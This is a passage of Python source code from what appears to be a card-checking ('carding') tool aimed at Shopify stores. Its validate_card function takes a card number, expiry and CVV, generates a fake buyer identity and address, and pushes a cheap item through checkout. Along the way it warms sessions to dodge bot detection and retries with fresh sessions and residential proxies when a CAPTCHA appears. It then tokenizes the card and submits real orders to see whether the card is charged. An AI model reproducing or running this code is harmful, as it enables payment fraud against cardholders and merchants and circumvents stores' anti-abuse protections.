        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    if profile.get("sec_ch_ua"):
        nav_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        nav_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        nav_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

    try:
        all_variants: list[dict] = []
        throttled = False

        for url in [
            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
            f"{base_url}/products.json?limit=250",
        ]:
            for attempt in range(3):
                try:
                    resp = await session.get(url, headers=nav_headers, allow_redirects=True)
                    if resp.status_code == 200:
                        data = orjson.loads(resp.content)
                        products = data.get("products", [])
                        if products:
                            all_variants = products
                            break
                    elif resp.status_code in (429, 430):
                        wait = (1.5 * (2 ** attempt)) + random.uniform(0.2, 0.8)
                        log.debug("throttled on %s (attempt %d), sleeping %.2fs",
                                  url, attempt + 1, wait)
                        throttled = True
                        await asyncio.sleep(wait)
                        continue
                    elif resp.status_code == 403:
                        throttled = True
                        break
                    else:
                        break
                except Exception:
                    if attempt < 2:
                        await asyncio.sleep(1.0)
                    continue
            if all_variants:
                break

        if not all_variants:
            if throttled:
                return None, [], "THROTTLED"
            return None, [], "No products found"

        # Collect candidates — STRICT cap filter (round-safe)
        candidates: list[dict] = []
        for product in all_variants:
            p_title = str(product.get("title", "")).lower()
            if any(bad in p_title for bad in ("tip", "donation", "gift card",
                                              "warranty", "route package", "insurance")):
                continue
            for variant in product.get("variants", []):
                try:
                    if variant.get("available", True) is False:
                        continue
                    price_f = round(float(variant.get("price") or "0"), 2)
                except (ValueError, TypeError):
                    continue
                if price_f <= 0.25:
                    continue
                if price_f > cap:      # ⭐ STRICT comparison (allows equal)
                    continue
                candidates.append({
                    "site":       base_url,
                    "price":      f"{price_f:.2f}",
                    "price_f":    price_f,
                    "variant_id": str(variant["id"]),
                    "title":      product.get("title", "Product"),
                    "handle":     product.get("handle", ""),
                })

        if not candidates:
            return None, [], f"No products under ${cap:.2f}"

        best = min(candidates, key=lambda c: c["price_f"])
        _product_cache[cache_key] = {
            "product":    best,
            "candidates": candidates,
            "err":        None,
            "ts":         now,
        }
        return best, candidates, None

    except (asyncio.TimeoutError, RequestsError):
        return None, [], "Timeout"
    except Exception as ex:
        return None, [], str(ex)
    finally:
        if owned:
            res = session.close()
            if asyncio.iscoroutine(res):
                await res


async def _warm_session(session: AsyncSession, ourl: str, profile: dict) -> None:
    """Visit a few pages to collect cookies — reduces bot-detection."""
    headers = {
        "User-Agent": profile["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": profile["accept_language"],
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }
    if profile.get("sec_ch_ua"):
        headers["sec-ch-ua"] = profile["sec_ch_ua"]
        headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
    try:
        await session.get(ourl, headers=headers, allow_redirects=True)
        await asyncio.sleep(random.uniform(0.4, 1.0))
        for path in random.sample(["/collections/all", "/cart"], 2):
            try:
                await session.get(f"{ourl}{path}", headers=headers, allow_redirects=True)
                await asyncio.sleep(random.uniform(0.3, 0.8))
            except Exception:
                pass
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Core validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  float = MAX_PRICE,
) -> dict:
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"
    cc_full  = f"{cc}|{month}|{year}|{cvv}"

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    cap      = round(float(max_price), 2)

    def R(response, **kw):
        return _make_result(response, cc_full, price, gateway, ourl, t0, **kw)

    # ── Dev/test store skip ───────────────────────────────────────────────
    if ".myshopify.com" in hostname:
        return R("SITE_SKIP",
                 reason="Development/trial Shopify store (.myshopify.com) cannot charge real cards",
                 detail="Use a production custom-domain store")

    sem = _site_semaphores[hostname]
    session, profile, owned = _make_session(proxy_str)

    async with sem:
        try:
            addr = _pick_address(ourl)
            first, last, email = _random_identity()

            # ── 0. Fetch products ──────────────────────────────────────────
            best, all_candidates, err = await _fetch_products(ourl, proxy_str, max_price=cap)

            if variant_id:
                matched = next(
                    (c for c in (all_candidates or [])
                     if str(c.get("variant_id")) == str(variant_id)),
                    None,
                )
                if not matched:
                    # Query the store for this specific variant price
                    try:
                        pj = await session.get(f"{ourl}/products.json?limit=250",
                                                headers={"User-Agent": profile["ua"]})
                        if pj.status_code == 200:
                            data = orjson.loads(pj.content)
                            for prod in data.get("products", []):
                                for v in prod.get("variants", []):
                                    if str(v.get("id")) == str(variant_id):
                                        vp = round(float(v.get("price") or "0"), 2)
                                        matched = {
                                            "variant_id": str(v.get("id")),
                                            "price":      f"{vp:.2f}",
                                            "price_f":    vp,
                                            "title":      prod.get("title", "Product"),
                                            "handle":     prod.get("handle", ""),
                                            "site":       ourl,
                                        }
                                        break
                                if matched:
                                    break
                    except Exception:
                        pass
                if not matched:
                    return R("SITE_ERROR",
                             reason="Requested variant not found on this store",
                             detail=f"variant_id={variant_id}")
                product_price_f = matched["price_f"]
                if product_price_f > cap:
                    return R("SITE_SKIP",
                             price=f"{product_price_f:.2f}",
                             reason=f"Requested variant price ${product_price_f:.2f} > max ${cap:.2f}")
                variant_id = matched["variant_id"]
                price = matched["price"]
            else:
                if not best:
                    return R("SITE_ERROR", reason="Could not fetch products",
                             detail=str(err))
                variant_id = best["variant_id"]
                price = best["price"]
                product_price_f = best["price_f"]
                if product_price_f > cap:
                    return R("SITE_SKIP",
                             price=f"{product_price_f:.2f}",
                             reason=f"Product price ${product_price_f:.2f} > max ${cap:.2f}")

            # ── 1. Warm session (collect cookies) ─────────────────────────
            await _warm_session(session, ourl, profile)

            base_headers = {
                "User-Agent": profile["ua"],
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": profile["accept_language"],
                "Content-Type": "application/json",
                "Origin": ourl,
                "Referer": f"{ourl}/",
            }
            if profile.get("sec_ch_ua"):
                base_headers["sec-ch-ua"] = profile["sec_ch_ua"]
                base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

            # ── 2. Add to cart ────────────────────────────────────────────
            cart_added = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                 "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct,
                                 "Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                except Exception:
                    continue

            if not cart_added:
                return R("SITE_ERROR", reason="Cart rejected add-to-cart")

            await asyncio.sleep(random.uniform(0.2, 0.5))

            # ── 3. Checkout page ──────────────────────────────────────────
            try:
                cr = await session.post(
                    f"{ourl}/checkout/",
                    allow_redirects=True,
                    headers={**base_headers,
                             "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"},
                )
                checkout_url = str(cr.url)
                page_text    = cr.text
            except (asyncio.TimeoutError, RequestsError):
                return R("SITE_ERROR", reason="Checkout page timed out")
            except Exception as ex:
                return R("SITE_ERROR",
                         reason=f"Checkout request failed: {type(ex).__name__}")

            lower_url = checkout_url.lower()
            if "captcha" in page_text.lower() or "/challenge" in lower_url:
                return R("CAPTCHA_REQUIRED",
                         reason="Shopify CAPTCHA at checkout page",
                         detail="Residential proxy + fresh cookies needed")
            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                return R("SITE_REQUIRES_LOGIN", reason="Store requires login/password")

            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
            if not attempt_token or len(attempt_token) < 4:
                return R("SITE_ERROR", reason="Could not extract attempt token")

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                return R("SITE_ERROR",
                         reason="Could not extract session token (bot protection likely)")

            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or
                "1"
            )
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text,
                         '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )
            for s, e in [('currencyCode&quot;:&quot;', "&quot;"),
                         ('"currencyCode":"', '"')]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            addr = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone  = addr["phone"]
            street = addr["address1"]
            city   = addr["city"]
            state  = addr["zoneCode"]
            s_zip  = addr["postalCode"]

            subtotal = (
                _extract(page_text,
                         'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                         "&quot;") or
                _extract(page_text,
                         '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else price

            unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id  = None
            m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text,
                                    'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            for pat in [
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                r'identificationSignature":"([^"]+)"',
                r'data-identification-signature="([^"]+)"',
            ]:
                mm = re.search(pat, unescaped)
                if mm:
                    ident_sig = mm.group(1)
                    break

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"
            gql_headers = {
                **base_headers,
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"]     = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput":  {"sessionToken": sst},
                    "queueToken":    queue_token or "",
                    "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": merch_id_full,
                                    "variantId": variant_id_full,
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": subtotal,
                                                               "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency,
                                              "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":         None,
                        "proposedTotalAmount":         {"value": {"amount": "0",
                                                                  "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":          [],
                    },
                    "note":               {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint":  {
                        "signature":             None, "signatureUuid":         None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # ── 4. Shipping proposal ──────────────────────────────────────
            ship_vars = _base_vars()
            resp_json: Any = None
            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING,
                              "variables": ship_vars,
                              "operationName": "Proposal"},
                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue
                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break
                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    log.debug("shipping proposal GQL errors: %s", gql_errs)
                    code = _parse_gql_errors(gql_errs)
                    if code in SITE_ERROR_CODES:
                        return R(code, reason="GraphQL error during shipping proposal")
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return R("GRAPHQL_ERROR",
                             reason="Shipping proposal failed after retries",
                             detail=str(gql_errs)[:200])

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return R("GRAPHQL_ERROR", reason="No session in shipping proposal")

            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            negotiate = resp_json["data"]["session"].get("negotiate") or {}
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return R(code, reason="Negotiation error")

            result_obj  = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return R("CAPTCHA_REQUIRED",
                         reason="Checkpoint denied — bot protection",
                         detail="Residential proxy required")
            if result_type in ("Throttled", "TooManyRequests"):
                return R("THROTTLED", reason="Site rate-limited us")
            if result_type == "NegotiationResultFailed":
                return R("SITE_ERROR", reason="Negotiation failed")

            checkpoint_data = result_obj.get("checkpointData")
            seller = result_obj.get("sellerProposal") or {}
            if not seller:
                return R("SITE_ERROR", reason="No seller proposal returned")

            running_total_data = seller.get("runningTotal") or {}
            running_total = (running_total_data.get("value", {}).get("amount")
                             or running_total_data.get("amount", "0"))

            # Collect ALL shipping strategies, pick cheapest
            delivery_data     = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount   = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    cheapest = None
                    cheapest_val = float("inf")
                    for st in strategies:
                        try:
                            amt_data = st.get("amount") or {}
                            amt = round(float(
                                amt_data.get("value", {}).get("amount")
                                or amt_data.get("amount") or "0"
                            ), 2)
                        except (ValueError, TypeError):
                            amt = float("inf")
                        if amt < cheapest_val:
                            cheapest_val = amt
                            cheapest     = st
                    if cheapest:
                        delivery_strategy = cheapest.get("handle", "")
                        shipping_amount   = cheapest_val if cheapest_val != float("inf") else 0.0

            tax_data = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = round(float(
                        tax_amt_data.get("value", {}).get("amount")
                        or tax_amt_data.get("amount") or "0"
                    ), 2)
                except (ValueError, TypeError):
                    pass

            # Total estimate check BEFORE tokenization
            try:
                total_estimate = round(float(running_total) + shipping_amount + tax_amount, 2)
            except (ValueError, TypeError):
                total_estimate = 0.0
            price = f"{total_estimate:.2f}"
            if total_estimate > cap:
                return R("SITE_SKIP",
                         reason=f"Total ${total_estimate:.2f} (product+ship+tax) > max ${cap:.2f}",
                         detail=f"product=${float(running_total):.2f} ship=${shipping_amount:.2f} tax=${tax_amount:.2f}")

            # Payment method — any credit-card method
            payment_data       = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                for line in (payment_data.get("availablePaymentLines") or []):
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if not pid:
                        continue
                    if pm.get("__typename", "") == "CustomerCreditCardPaymentMethod":
                        continue
                    payment_identifier = pid
                    gateway = (pm.get("extensibilityDisplayName")
                               or pm.get("name") or "Shopify Payments")
                    break

            if not payment_identifier:
                return R("NO_PAYMENT_GATEWAY",
                         reason="Site offers no credit-card payment method")

            # ── 5. Delivery proposal ──────────────────────────────────────
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst
            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {
                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                },
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                "number": phone, "countryCode": country_code
            }
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY,
                          "variables": deliv_vars,
                          "operationName": "Proposal"},
                )
                d_resp = orjson.loads(dr.content)
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                d_result = (d_resp.get("data", {}).get("session", {})
                            .get("negotiate", {}).get("result", {}))
                if d_result:
                    if d_result.get("__typename") == "SubmittedForCompletion":
                        return R("NO_PAYMENT_REQUIRED",
                                 reason="Checkout auto-submitted (free/digital goods)")
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                    d_delivery = d_seller.get("delivery") or {}
                    if d_delivery.get("__typename") == "FilledDeliveryTerms":
                        d_lines = d_delivery.get("deliveryLines") or []
                        if d_lines:
                            d_strats = d_lines[0].get("availableDeliveryStrategies") or []
                            d_sel = d_lines[0].get("selectedDeliveryStrategy") or {}
                            if d_sel.get("handle"):
                                delivery_strategy = d_sel["handle"]
                            if d_strats:
                                try:
                                    sa = d_strats[0].get("amount") or {}
                                    shipping_amount = round(float(
                                        sa.get("value", {}).get("amount")
                                        or sa.get("amount") or "0"), 2)
                                except (ValueError, TypeError):
                                    pass
                    d_tax = d_seller.get("tax") or {}
                    if d_tax.get("__typename") == "FilledTaxTerms":
                        try:
                            ta = d_tax.get("totalTaxAmount") or {}
                            tax_amount = round(float(
                                ta.get("value", {}).get("amount")
                                or ta.get("amount") or "0"), 2)
                        except (ValueError, TypeError):
                            pass

                    try:
                        total_estimate = round(float(running_total)
                                               + shipping_amount + tax_amount, 2)
                    except (ValueError, TypeError):
                        total_estimate = 0.0
                    price = f"{total_estimate:.2f}"
                    if total_estimate > cap:
                        return R("SITE_SKIP",
                                 reason=f"Total ${total_estimate:.2f} after delivery proposal > max ${cap:.2f}",
                                 detail=f"product=${float(running_total):.2f} ship=${shipping_amount:.2f} tax=${tax_amount:.2f}")
            except Exception as ex:
                log.debug("delivery proposal error: %s", ex)

            # ── 6. Tokenize card ──────────────────────────────────────────
            vault_payload = {
                "credit_card": {
                    "number":             cc,
                    "month":              int(month),
                    "year":               int(f"20{year}"),
                    "verification_value": cvv,
                    "name":               f"{first} {last}",
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type":       "application/json",
                "Accept":             "application/json",
                "Accept-Language":    profile["accept_language"],
                "Origin":             "https://checkout.pci.shopifyinc.com",
                "User-Agent":         profile["ua"],
            }
            if profile.get("sec_ch_ua"):
                vault_headers["sec-ch-ua-mobile"]   = profile["sec_ch_ua_mobile"]
                vault_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            for vault_url in [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]:
                try:
                    vr = await session.post(vault_url, json=vault_payload,
                                            headers=vault_headers)
                    token = (orjson.loads(vr.content)).get("id")
                    if token:
                        break
                except Exception:
                    continue
            if not token:
                return R("SITE_ERROR", reason="Card tokenization vault unreachable")

            # ── 7. Submit ─────────────────────────────────────────────────
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }

            def _build_submit_body() -> dict:
                submit_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {"phone": phone},
                }
                submit_line["expectedTotalPrice"] = {"any": True}

                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}

                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput": {"sessionToken": sst},
                            "queueToken":   queue_token or "",
                            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines":              [submit_line],
                                "noDeliveryRequired":         [],
                                "useProgressiveRates":        True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping":      True,
                            },
                            "merchandise": submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_identifier,
                                            "sessionId":               token,
                                            "billingAddress":          billing_addr,
                                            "cardSource":              None,
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity": copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations":         None,
                                "proposedTotalAmount":         {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions":          [],
                            },
                            "tip":                {"tipLines": []},
                            "note":               {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties":     {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            s_resp: dict = {}
            s_data: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(
                        graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=_build_submit_body(),
                    )
                    s_resp = orjson.loads(sr.content)
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError):
                    return R("SITE_ERROR", reason="Submit request timed out")
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return R("SITE_ERROR",
                             reason=f"Submit exception: {type(ex).__name__}")

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    raw = str(errs)
                    code = classify_raw(raw)
                    if code == "CARD_DECLINED":
                        code = "SITE_ERROR"
                    return R(code, raw=raw,
                             reason="Submit returned top-level GraphQL errors")

                stype = s_data.get("__typename", "")

                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    codes = [str(e.get("code") or "").upper() for e in sub_errs]

                    # CAPTCHA retry with fresh session
                    if any("CAPTCHA" in c for c in codes):
                        if submit_attempt < 2:
                            await session.close()
                            session, profile, _ = _make_session(proxy_str)
                            await _warm_session(session, ourl, profile)
                            await asyncio.sleep(random.uniform(2.0, 4.0))
                            try:
                                cr2 = await session.post(
                                    f"{ourl}/checkout/", allow_redirects=True,
                                    headers={**base_headers,
                                             "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"})
                                new_sst = _extract_sst(cr2.text, dict(cr2.headers))
                                if new_sst:
                                    sst = new_sst
                                    gql_headers["x-checkout-one-session-token"] = sst
                            except Exception:
                                pass
                            continue
                        return R("CAPTCHA_REQUIRED",
                                 reason="CAPTCHA persists after retries",
                                 detail="Residential proxy required")

                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation"
                        for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        await asyncio.sleep(0.5)
                        continue
                break

            stype = s_data.get("__typename", "")

            # ── 8. Handle submit result ───────────────────────────────────
            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return R("ORDER_PLACED", charged=True, approved=True)
                if rtype == "ActionRequiredReceipt":
                    action = receipt.get("action") or {}
                    detail = f"3DS challenge: {action.get('__typename', 'unknown')}"
                    return R("3DS_REQUIRED", approved=True,
                             reason="Issuer requires 3DS authentication",
                             detail=detail, raw=str(action)[:300])
                if rtype == "FailedReceipt":
                    pe = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return R("NO_PRODUCT", reason="Inventory lost during checkout")
                    if pe_type == "OrderCreationFailure":
                        return R("ORDER_CREATION_FAILED",
                                 reason="Order creation failed on site")
                    code = str(pe.get("code") or "").upper()
                    msg  = str(pe.get("messageUntranslated") or "").upper()
                    raw  = code if code and code != "GENERIC_ERROR" else msg
                    norm = classify_raw(raw)
                    return R(norm, raw=raw, reason=f"Payment failed: {raw[:120]}")

                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query": QUERY_POLL,
                        "variables": {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers,
                                json=poll_body,
                            )
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return R("ORDER_PLACED", charged=True, approved=True)
                            if pt == "ActionRequiredReceipt":
                                act = pd.get("action") or {}
                                return R("3DS_REQUIRED", approved=True,
                                         reason="Issuer requires 3DS authentication",
                                         detail=f"3DS challenge: {act.get('__typename','')}",
                                         raw=str(act)[:300])
                            if pt == "FailedReceipt":
                                pe = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure",
                                               "InventoryReservationFailure"):
                                    return R("NO_PRODUCT")
                                code = str(pe.get("code") or "").upper()
                                msg  = str(pe.get("messageUntranslated") or "").upper()
                                raw  = code if code and code != "GENERIC_ERROR" else msg
                                return R(classify_raw(raw), raw=raw,
